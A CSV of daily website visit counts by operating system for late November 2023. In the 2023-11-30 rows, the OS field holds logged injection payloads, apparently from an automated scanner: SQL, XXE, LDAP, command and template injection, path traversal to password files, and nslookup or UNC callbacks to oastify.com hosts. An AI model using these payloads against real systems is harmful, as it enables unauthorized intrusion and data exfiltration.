date,os,visits
2023-11-30,Android,9210307
2023-11-30,Macintosh,4924649
2023-11-30,Chrome OS,1298595
2023-11-30,Linux,1062833
2023-11-30,(not set),36494
2023-11-30,Tizen,1330
2023-11-30,OS/2,698
2023-11-30,Fuchsia,558
2023-11-30,Firefox OS,500
2023-11-30,Playstation 4,361
2023-11-30,BlackBerry,119
2023-11-30,FreeBSD,77
2023-11-30,OpenBSD,48
2023-11-30,UNIX,40
2023-11-30,Samsung,35
2023-11-30,Windows Phone,34
2023-11-30,SymbianOS,23
2023-11-30,NetBSD,21
2023-11-30,Xbox,16
2023-11-30,Playstation Vita,15
2023-11-30,Mac OS,13
2023-11-30,Sony,6
2023-11-30,Nokia,5
2023-11-30,PalmOS,4
2023-11-30,SunOS,3
2023-11-30,MOT,2
2023-11-30,Nintendo Wii,2
2023-11-30,"(select extractvalue(xmltype('<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE root [ <!ENTITY % graxq SYSTEM ""http://woo7ur2i2kf80r9v5bzoe0ssajgc42s5gw31rq.oasti'||'fy.com/"">%graxq;]>'),'/l') from dual)",1
2023-11-30,(select load_file('\\\\fo7qua2123fr0a9e5uz7ejsba2gv4lscu0lnqbf.oastify.com\\eqb')),1
2023-11-30,*)(!(objectClass=*),1
2023-11-30,*)(objectClass=*,1
2023-11-30,-->'-->`--><!--#set var=vgy value=ufx5lptgti--><!--#set var=xi0 value=whz7nrvivk--><!--#echo var=vgy--><!--#echo var=xi0--><!--#exec cmd=nslookup -q=cname h2ks8cg3g5ttecngjwd9sl6do4uxin6f43vq0ep.oastify.com -->,1
2023-11-30,.../Linux,1
2023-11-30,../../../../../../../../../../../../../../../../etc/passwd,1
2023-11-30,../../../../../../../../../../../../../../../../etc/passwd%00Linux,1
2023-11-30,..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini,1
2023-11-30,..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini%00Linux,1
2023-11-30,/etc/passwd,1
2023-11-30,4uivbesp1i)(!(objectClass=*),1
2023-11-30,"<ckj xmlns=""http://a.b/"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xsi:schemaLocation=""http://a.b/ http://il7trdz4z6cuxd6h2xwabmpe75dy1opodf0ko9.oastify.com/ckj.xsd"">ckj</ckj>",1
2023-11-30,"<ydl xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""http://vsr6yq6h6jj74qdu9a3nizwreikb81w2kt7yvn.oastify.com/foo""/></ydl>",1
2023-11-30,BeOS,1
2023-11-30,LG,1
2023-11-30,"Linux
BCC:go8rub2224fs0b9f5vz8eksca3gw4msel2cphd6@oastify.com
vte: d",1
2023-11-30,"Linux""",1
2023-11-30,"Linux""|echo d47iksvf5m ctdmejl6bp ||",1
2023-11-30,"Linux""|ping -n 21 127.0.0.1 ||",1
2023-11-30,"Linux%}lvxrn'/""<pnroj",1
2023-11-30,Linux&echo 4r76ggl8d8 freo5ed8r5&,1
2023-11-30,"Linux&nslookup -q=cname 6krhq1ysyubiw1551lvyaao26tcm0co7cyz3ns.oastify.com.&'\""`0&nslookup -q=cname 6krhq1ysyubiw1551lvyaao26tcm0co7cyz3ns.oastify.com.&`'",1
2023-11-30,Linux&ping -n 21 127.0.0.1&,1
2023-11-30,Linux',1
2023-11-30,Linux' and '3424'='3424,1
2023-11-30,Linux' and '4452'='4460,1
2023-11-30,Linux' and (select*from(select(sleep(20)))a)-- ,1
2023-11-30,Linux' and 2206=2208-- ,1
2023-11-30,Linux' and 4141=4141-- ,1
2023-11-30,Linux' waitfor delay'0:0:20'--,1
2023-11-30,"Linux'""`0&nslookup -q=cname 5hngn0vrvt8ht024yksx79l13s9lxbl89zw4kt.oastify.com.&`'",1
2023-11-30,Linux'(select*from(select(sleep(20)))a)',1
2023-11-30,Linux');declare @q varchar(99);set @q='\\255dbxjojqwehxq1mhguv69yrpxil89z2ntayyn.oasti'+'fy.com\hrs'; exec master.dbo.xp_dirtree @q;-- ,1
2023-11-30,Linux')waitfor delay'0:0:20'--,1
2023-11-30,"Linux'+(function(){if(typeof zxmyz===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);zxmyz=1;}}())+'",1
2023-11-30,Linux'+(select load_file('\\\\mqgxwh484ahy2hbl711egquic9i26sujx7outii.oastify.com\\cvk'))+',1
2023-11-30,Linux'+(select*from(select(sleep(20)))a)+',1
2023-11-30,"Linux'+eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))+'",1
2023-11-30,Linux'+sleep(20.to_i)+',1
2023-11-30,"Linux',0)waitfor delay'0:0:20'--",1
2023-11-30,Linux'.sleep(20).',1
2023-11-30,Linux';declare @q varchar(99);set @q='\\sie3onwewg94un3rz7tk8wmo4fa8yympdd409oy.oasti'+'fy.com\gts'; exec master.dbo.xp_dirtree @q;-- ,1
2023-11-30,"Linux'|echo 3o866q8h9s cd9w4term0 #xzwx",1
2023-11-30,"Linux'|ping -c 21 127.0.0.1 #",1
2023-11-30,"Linux'||(select extractvalue(xmltype('<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE root [ <!ENTITY % graxq SYSTEM ""http://jylu4ec5c7pvaejify9bon2fk6qzep2tqkdp1e.oasti'||'fy.com/"">%graxq;]>'),'/l') from dual)||'",1
2023-11-30,Linux);declare @q varchar(99);set @q='\\grbrxb5254is3bcf8v28hkvcd3jw7mvdn1eojc8.oasti'+'fy.com\dwu'; exec master.dbo.xp_dirtree @q;-- ,1
2023-11-30,"Linux,(select*from(select(sleep(20)))a)",1
2023-11-30,Linux../../../../../../../../../../../../../../../../etc/passwd,1
2023-11-30,Linux..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini,1
2023-11-30,Linux42267017' or '7302'='7303,1
2023-11-30,Linux43845002' or 7978=7978-- ,1
2023-11-30,Linux65212037' or 2382=2388-- ,1
2023-11-30,Linux74903521' or '9415'='9415,1
2023-11-30,Linux;declare @q varchar(99);set @q='\\b3fm96hxhzunf6oakqe3tf77pyvrjh78xwojt7i.oasti'+'fy.com\yay'; exec master.dbo.xp_dirtree @q;-- ,1
2023-11-30,"Linux>
BCC:nb2yhip9pb2zniwms2mf1rfjxa33rtfl990w5ku@oastify.com
hto: e",1
2023-11-30,Linux]]>><,1
2023-11-30,"Linuxsll52%>xo4ck'/""<zg08j",1
2023-11-30,Linuxwg2r40hwrc,1
2023-11-30,Linux{${sleep(20)}},1
2023-11-30,"Linux|echo 8dlxnd1jx8 571y402hz1||a #' |echo 8dlxnd1jx8 571y402hz1||a #|"" |echo 8dlxnd1jx8 571y402hz1||a #",1
2023-11-30,"Linux|nslookup -q=cname zloaruzlzncbxu6y2ewrb3pv7mdf15p1ds0xom.oastify.com.&",1
2023-11-30,"Linux|ping -c 21 127.0.0.1||x",1
2023-11-30,"Linux|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",1
2023-11-30,"Linux}}g3za3'/""<vb6sf",1
2023-11-30,OPPO/CPH2239/OP4F2F:11/RP1A.200720.011/1690886540868:user/release-keys,1
2023-11-30,be51smiq09,1
2023-11-30,c:\windows\win.ini,1
2023-11-30,"eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))",1
2023-11-30,http://ei0po9w0w29qu93dztt68ima41auykmaa1x6lv.oastify.com/?Linux,1
2023-11-30,n1py7if9fbszdimmi2cfrr5jnat3ht5ltcgh46.oastify.com,1
2023-11-30,n4p4ifaq49)(objectClass=*,1
2023-11-30,nslookup -q=cname 94bka4ivixvlg4p8lof1ud85qwwpkf88bw2j77w.oastify.com.&,1
2023-11-30,rr8iw0o5dt,1
2023-11-29,iOS,18920876
2023-11-29,Windows,15747501
2023-11-29,Android,8914422
2023-11-29,Macintosh,4961379
2023-11-29,Chrome OS,1240160
2023-11-29,Linux,1038084
2023-11-29,(not set),33160
2023-11-29,Tizen,899
2023-11-29,OS/2,593
2023-11-29,Fuchsia,580
2023-11-29,Firefox OS,466
2023-11-29,Playstation 4,335
2023-11-29,BlackBerry,109
2023-11-29,FreeBSD,91
2023-11-29,UNIX,72
2023-11-29,Samsung,41
2023-11-29,OpenBSD,40
2023-11-29,Windows Phone,40
2023-11-29,SymbianOS,31
2023-11-29,Xbox,19
2023-11-29,NetBSD,18
2023-11-29,Sony,16
2023-11-29,Mac OS,15
2023-11-29,SunOS,14
2023-11-29,Nokia,6
2023-11-29,MOT,2
2023-11-29,NTT DoCoMo,2
2023-11-29,PalmOS,2
2023-11-29,Playstation 3,2
2023-11-29,Playstation Vita,2
2023-11-29,Solaris,2
2023-11-29,BeOS,1
2023-11-29,IRIX,1
2023-11-29,LG,1
2023-11-28,iOS,17826241
2023-11-28,Windows,15522539
2023-11-28,Android,8512451
2023-11-28,Macintosh,5134088
2023-11-28,Chrome OS,1243361
2023-11-28,Linux,1083147
2023-11-28,(not set),40256
2023-11-28,Tizen,892
2023-11-28,OS/2,633
2023-11-28,Fuchsia,601
2023-11-28,Firefox OS,440
2023-11-28,Playstation 4,333
2023-11-28,BlackBerry,128
2023-11-28,FreeBSD,95
2023-11-28,Samsung,39
2023-11-28,UNIX,36
2023-11-28,OpenBSD,30
2023-11-28,SymbianOS,29
2023-11-28,Xbox,27
2023-11-28,Windows Phone,22
2023-11-28,NetBSD,18
2023-11-28,SunOS,11
2023-11-28,Playstation Vita,9
2023-11-28,Nokia,5
2023-11-28,Sony,4
2023-11-28,Mac OS,3
2023-11-28,NTT DoCoMo,2
2023-11-28,PalmOS,2
2023-11-28,BeOS,1
2023-11-28,MOT,1
2023-11-28,Playstation Portable,1
2023-11-28,WebTV,1
2023-11-28,macOS X,1
2023-11-27,iOS,17441512
2023-11-27,Windows,16375703
2023-11-27,Android,8519500
2023-11-27,Macintosh,5019810
2023-11-27,Chrome OS,1119338
2023-11-27,Linux,1015509
2023-11-27,(not set),34099
2023-11-27,Tizen,910
2023-11-27,OS/2,609
2023-11-27,Fuchsia,566
2023-11-27,Firefox OS,462
2023-11-27,Playstation 4,304
2023-11-27,BlackBerry,114
2023-11-27,FreeBSD,106
2023-11-27,OpenBSD,53
2023-11-27,UNIX,50
2023-11-27,Samsung,41
2023-11-27,SymbianOS,30
2023-11-27,Xbox,28
2023-11-27,NetBSD,24
2023-11-27,Windows Phone,23
2023-11-27,SunOS,12
2023-11-27,Playstation Vita,8
2023-11-27,Sony,7
2023-11-27,Nintendo Wii,5
2023-11-27,Nokia,5
2023-11-27,PalmOS,2
2023-11-27,LG,1
2023-11-27,MOT,1
2023-11-27,Mac OS,1
2023-11-27,NTT DoCoMo,1
2023-11-27,WebTV,1
2023-11-27,iPhone,1
2023-11-27,samsung/a14xub/a14x:13/TP1A.220624.014/A146MUBU2AWF4:user/release-keys,1
2023-11-26,iOS,11883302
2023-11-26,Android,6341407
2023-11-26,Windows,5719497
2023-11-26,Macintosh,2980726
2023-11-26,Linux,818510
2023-11-26,Chrome OS,347851
2023-11-26,(not set),25857
2023-11-26,Tizen,955
2023-11-26,Fuchsia,656
2023-11-26,OS/2,643
2023-11-26,Firefox OS,472
2023-11-26,Playstation 4,296
2023-11-26,BlackBerry,85
2023-11-26,FreeBSD,68
2023-11-26,Samsung,47
2023-11-26,UNIX,47
2023-11-26,OpenBSD,44
2023-11-26,SymbianOS,26
2023-11-26,Windows Phone,22
2023-11-26,Xbox,21
2023-11-26,NetBSD,20
2023-11-26,Playstation Vita,9
2023-11-26,Unknown,9
2023-11-26,Sony,7
2023-11-26,Mac OS,6
2023-11-26,Nokia,5
2023-11-26,SunOS,5
2023-11-26,iPhone,5
2023-11-26,Bada,4
2023-11-26,PalmOS,3
2023-11-26,Nintendo Wii,2
2023-11-26,BeOS,1
2023-11-25,iOS,13040965
2023-11-25,Android,6816631
2023-11-25,Windows,4967675
2023-11-25,Macintosh,2539208
2023-11-25,Linux,852744
2023-11-25,Chrome OS,271050
2023-11-25,(not set),22654
2023-11-25,Tizen,823
2023-11-25,OS/2,587
2023-11-25,Fuchsia,505
2023-11-25,Firefox OS,414
2023-11-25,Playstation 4,332
2023-11-25,BlackBerry,121
2023-11-25,FreeBSD,62
2023-11-25,UNIX,48
2023-11-25,Samsung,46
2023-11-25,Windows Phone,31
2023-11-25,OpenBSD,27
2023-11-25,SymbianOS,23
2023-11-25,NetBSD,22
2023-11-25,Xbox,16
2023-11-25,Sony,11
2023-11-25,PalmOS,6
2023-11-25,SunOS,6
2023-11-25,Mac OS,5
2023-11-25,Playstation Vita,5
2023-11-25,iPhone,5
2023-11-25,Nintendo Wii,4
2023-11-25,IRIX,3
2023-11-25,Nokia,3
2023-11-25,LG,2
2023-11-25,BeOS,1
2023-11-25,Playstation Portable,1
2023-11-25,Solaris,1
2023-11-24,iOS,13953271
2023-11-24,Android,7273453
2023-11-24,Windows,6862704
2023-11-24,Macintosh,2724185
2023-11-24,Linux,892154
2023-11-24,Chrome OS,298538
2023-11-24,(not set),28173
2023-11-24,Tizen,924
2023-11-24,OS/2,590
2023-11-24,Fuchsia,497
2023-11-24,Firefox OS,448
2023-11-24,Playstation 4,369
2023-11-24,BlackBerry,111
2023-11-24,FreeBSD,83
2023-11-24,Samsung,47
2023-11-24,OpenBSD,36
2023-11-24,UNIX,26
2023-11-24,Windows Phone,26
2023-11-24,SymbianOS,20
2023-11-24,Xbox,19
2023-11-24,NetBSD,17
2023-11-24,Mac OS,10
2023-11-24,Playstation Vita,6
2023-11-24,SunOS,5
2023-11-24,Nokia,4
2023-11-24,PalmOS,4
2023-11-24,WebTV,4
2023-11-24,Sony,2
2023-11-24,macOS X,2
2023-11-24,Nokia/Monster_00WW/MNR:11/RP1A.201005.001/00WW_1_910:user/release-keys,1
2023-11-24,Playstation 3,1
2023-11-24,Unknown,1
2023-11-24,iPhone,1
2023-11-24,samsung/dm1qsqw/dm1q:13/TP1A.220624.014/S911USQU1AWGH:user/release-keys,1
2023-11-23,iOS,10261966
2023-11-23,Android,5904223
2023-11-23,Windows,4979504
2023-11-23,Macintosh,2073245
2023-11-23,Linux,958396
2023-11-23,Chrome OS,260846
